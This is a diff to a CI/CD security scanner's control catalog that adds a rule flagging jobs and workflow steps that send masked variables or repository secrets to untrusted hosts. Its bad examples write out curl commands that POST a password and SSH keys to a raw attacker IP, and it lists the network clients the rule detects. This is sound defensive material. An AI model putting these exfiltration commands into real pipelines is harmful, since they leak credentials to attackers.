@@ -303,6 +303,20 @@ export const controlCatalog: Record<
         "Container escape and lateral movement risk applies to self-hosted runners the same way it does to GitLab shared runners.",
     },
   },
+  pipelineMustNotSendSecretsToUntrustedHosts: {
+    gitlab: {
+      controlDescription:
+        "Flags a job that hands a masked CI/CD variable or predefined token to a network client (`curl`, `wget`, `nc`, `Invoke-WebRequest`, httpie) aimed at a host or IP the policy does not trust. Loopback addresses and single-label hosts such as a `services:` alias never count as destinations, not configurably. Needs the settings-variables lane to know which variables are masked; without a token the control reports not evaluable.",
+      controlWhyItMatters:
+        "The GhostAction shape (GitGuardian, 2025 and 2026): an injected job posts secrets to an attacker-controlled address. Masking hides a value from the log, not from the job's own outbound traffic.",
+    },
+    github: {
+      controlDescription:
+        "Flags a step that hands a `${{ secrets.NAME }}` interpolation, or an env key bound to one, to a network client (`curl`, `wget`, `nc`, `Invoke-WebRequest`, httpie) aimed at a host or IP the policy does not trust. Loopback addresses and single-label hosts never count as destinations, not configurably.",
+      controlWhyItMatters:
+        "The GhostAction shape (GitGuardian, 2025 and 2026): an injected step posts secrets to an attacker-controlled address. A destination held in a variable is never judged, so the policy only covers literal URLs.",
+    },
+  },
   branchMustBeProtected: {
     gitlab: {
       controlDescription:
@@ -2363,7 +2377,7 @@ signature_verified:
         "`trustedUrls` is host-precise: `https://example.com/*` does NOT match `https://evil.example.com/*`.",
         "Consider vendoring external scripts into your repository for full control over their content; use a trusted package manager (apt, brew, pip) instead of raw script downloads when possible.",
       ],
-      relatedCodes: ["ISSUE-401", "ISSUE-204"],
+      relatedCodes: ["ISSUE-401", "ISSUE-204", "ISSUE-311"],
     },
     github: {
       title: "Unverified script execution",
@@ -2448,7 +2462,7 @@ jobs:
         "A leading `echo`/`printf` piping in-workflow data into an interpreter (`echo \"$NEEDS_CONTEXT\" | python3 -c …`) is local data, not a download. It does not fire unless `curl`/`wget`/`base64` is also on the line.",
         "Inline payloads on `pull_request_target` workflows are especially dangerous. Combine ISSUE-411 with ISSUE-802 (dangerous-triggers) for the full Megalodon defence.",
       ],
-      relatedCodes: ["ISSUE-207", "ISSUE-802", "ISSUE-703"],
+      relatedCodes: ["ISSUE-207", "ISSUE-802", "ISSUE-703", "ISSUE-311"],
     },
   },
 
@@ -4247,6 +4261,96 @@ jobs:
       ],
       status: "shipping",
       relatedCodes: ["ISSUE-307", "ISSUE-801", "ISSUE-309"],
+    },
+  },
+
+  "ISSUE-311": {
+    code: "ISSUE-311",
+    gitlab: {
+      title: "Secret sent to an untrusted host",
+      category: "CI/CD Secrets",
+      severity: "critical",
+      productScope: "cli",
+      controlName: "Pipeline must not send secrets to untrusted hosts",
+      controlConfigKey: "pipelineMustNotSendSecretsToUntrustedHosts",
+      description:
+        "A job hands a masked CI/CD variable, or a predefined token such as `CI_JOB_TOKEN`, to a network client (`curl`, `wget`, `nc`, `Invoke-WebRequest`, httpie) aimed at a literal `host[:port]` or bare IP the policy does not trust; a URL sitting only in a trailing, unquoted comment is not a destination. One finding per job and destination. `localhost`, any `127.0.0.0/8` address, `::1`, and a single-label host with no dot (a `services:` alias such as `docker` or `postgres`, or a linked container) never fire: the secret stays on the runner, and this is not configurable.",
+      impact:
+        "This is the GhostAction shape (GitGuardian, 2025 and 2026): an injected pipeline whose single job posts repository secrets to an attacker-controlled address. Masking only hides a value from the job log; it does nothing to stop the job itself from sending that value to a host nobody vetted.",
+      remediation:
+        "Allowlist the real destination with `trustedHosts` instead of disabling the control. This GitLab instance and its container registry are already trusted by default through `trustVcsHosts`.",
+      badExample: `# .gitlab-ci.yml: ❌ Secret posted to an untrusted IP
+deploy:
+  script:
+    - curl -s -X POST -d "password=$PASSWORD" http://193.32.204.199`,
+      badExampleCaption: "The masked variable `$PASSWORD` is sent to a raw IP the policy does not trust, the GhostAction shape.",
+      goodExample: `# .gitlab-ci.yml: ✅ Trusted destination
+deploy:
+  script:
+    - curl -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/$CI_PROJECT_ID/repository/commits"
+
+# .plumber.yaml
+gitlab:
+  controls:
+    pipelineMustNotSendSecretsToUntrustedHosts:
+      enabled: true
+      trustVcsHosts: true
+      trustedHosts:
+        - "*.internal.example.com" # also trust an internal collector`,
+      goodExampleCaption: "The instance's own API is trusted by default (trustVcsHosts); an internal host can be added to trustedHosts.",
+      tips: [
+        "Allowlist internal hosts with `trustedHosts` globs rather than disabling the control entirely; a numeric-first-label glob like `10.*` matches IP literals only, never a hostname, and a glob with no port does not also cover that host on a port (add a separate `*.internal.example.com:*` entry).",
+        "A destination held in a variable (for example `$WEBHOOK_URL`) is never judged, so a literal URL is what gets reviewed.",
+        "Run with an API token: the masked flags come from the settings-variables lane, and without one the control reports not evaluable.",
+        "A four-part version string in request data (for example `\"tag\":\"1.2.3.4\"`) still reads as an IP destination; a quoted command word (`\"curl\"`) or an internationalized domain name does not.",
+      ],
+      status: "shipping",
+      relatedCodes: ["ISSUE-202", "ISSUE-411"],
+    },
+    github: {
+      title: "Secret sent to an untrusted host",
+      category: "CI/CD Secrets",
+      severity: "critical",
+      productScope: "cli",
+      controlName: "Workflow must not send secrets to untrusted hosts",
+      controlConfigKey: "pipelineMustNotSendSecretsToUntrustedHosts",
+      description:
+        "A step hands a `${{ secrets.NAME }}` interpolation, or an env key bound to one, to a network client (`curl`, `wget`, `nc`, `Invoke-WebRequest`, httpie) aimed at a literal `host[:port]` or bare IP the policy does not trust; a URL sitting only in a trailing, unquoted comment is not a destination. One finding per job and destination. `localhost`, any `127.0.0.0/8` address, `::1`, and a single-label host with no dot (a service container alias, or a linked container) never fire: the secret stays on the runner, and this is not configurable.",
+      impact:
+        "This is the GhostAction shape (GitGuardian, 2025 and 2026): an injected workflow whose single step posts repository secrets to an attacker-controlled address. Once a secret leaves the job over an untrusted connection, whatever it unlocks (a deploy key, a cloud credential, the token itself) belongs to the attacker.",
+      remediation:
+        "Allowlist the real destination with `trustedHosts` instead of disabling the control. GitHub's own API is already trusted by default through `trustVcsHosts`.",
+      badExample: `# .github/workflows/deploy.yml: ❌ the GhostAction shape
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -s -X POST -d 'VPS_HOST=\${{ secrets.VPS_HOST }}&VPS_SSH_KEY=\${{ secrets.VPS_SSH_KEY }}' http://193.32.204.199`,
+      badExampleCaption: "An injected step posts two repository secrets to an attacker-controlled IP; GitGuardian tracked this exact shape across the 2025 and 2026 GhostAction campaigns.",
+      goodExample: `# .github/workflows/deploy.yml: ✅ Trusted destination
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -H "Authorization: Bearer \${{ secrets.GITHUB_TOKEN }}" https://api.github.com/repos/o/r/issues/1/comments
+
+# .plumber.yaml
+github:
+  controls:
+    pipelineMustNotSendSecretsToUntrustedHosts:
+      enabled: true
+      trustVcsHosts: true
+      trustedHosts:
+        - "*.internal.example.com" # also trust an internal collector`,
+      goodExampleCaption: "api.github.com is trusted by default (trustVcsHosts); an internal collector can be added to trustedHosts.",
+      tips: [
+        "Allowlist internal hosts with `trustedHosts` globs rather than disabling the control entirely; a numeric-first-label glob like `10.*` matches IP literals only, never a hostname, and a glob with no port does not also cover that host on a port (add a separate `*.internal.example.com:*` entry).",
+        "A destination held in a variable (for example `$WEBHOOK_URL`) is never judged, so a literal URL is what gets reviewed.",
+        "A four-part version string in request data (for example `\"tag\":\"1.2.3.4\"`) still reads as an IP destination; a quoted command word (`\"curl\"`) or an internationalized domain name does not.",
+      ],
+      status: "shipping",
+      relatedCodes: ["ISSUE-309", "ISSUE-411", "ISSUE-801"],
     },
   },
 
